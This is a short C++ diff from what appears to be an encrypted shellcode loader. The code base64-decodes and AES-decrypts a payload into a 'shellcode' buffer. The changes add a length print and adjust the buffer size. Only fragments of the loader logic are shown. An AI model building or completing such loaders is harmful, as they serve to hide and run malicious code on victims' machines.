@@ -24,6 +24,7 @@ std::string Base64Decode(std::string*);";
 	std::string decrypted = Decrypt(&base64PayloadString, &base64KeyString, &base64IvString);
 
 	//// To unsigned char
+	std::cout << ""shellcode length: "" << decrypted.length() << std::endl;
 	unsigned char shellcode[decrypted.length()];
 	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);";
 
@@ -47,7 +48,7 @@ std::string Base64Decode(std::string*);";
 	std::string decrypted = AesDecrypt(key, iv, payloadString);
 
 	// To unsigned char
-	unsigned char shellcode[decrypted.length() + 1];
+	unsigned char shellcode[decrypted.length()];
 	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);
 
 	// Return
